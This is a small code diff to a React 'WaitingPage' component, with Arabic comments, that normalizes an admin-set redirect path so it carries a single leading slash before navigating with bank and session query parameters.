@@ -24,7 +24,9 @@ export default function WaitingPage() {
 
     // 1. التحقق من وجود توجيه يدوي من الآدمن أولاً
     if (sessionStatus.redirectTarget) {
-      setLocation(`/${sessionStatus.redirectTarget}?bank=${bank}&session=${sessionId}`);
+      // redirectTarget قد يبدأ بـ / أو بدونها
+      const target = sessionStatus.redirectTarget.startsWith('/') ? sessionStatus.redirectTarget : `/${sessionStatus.redirectTarget}`;
+      setLocation(`${target}?bank=${bank}&session=${sessionId}`);
       return;
     }
 
